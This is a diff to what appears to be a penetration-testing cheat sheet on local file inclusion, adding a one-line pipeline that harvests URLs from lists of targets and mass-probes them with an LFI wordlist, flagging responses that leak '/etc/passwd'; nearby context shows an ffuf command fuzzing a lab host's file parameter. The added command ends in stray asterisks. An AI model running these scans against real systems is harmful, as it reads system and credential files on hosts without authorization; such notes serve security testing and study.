@@ -440,6 +440,10 @@ parameth -u $TARGET
 ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -u http://10.10.41.192/playground.php?file=FUZZ -fr Failed
 ```
 
+```bash
+cat targets.txt | (gau || hakrawler || waybackurls || katana) |  grep "=" |  uro | httpx -silent -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"****
+```
+
 files we are intersted to see
 
 | /etc/issue                  | contains a message or system identification to be printed before the login prompt.                                                                                |
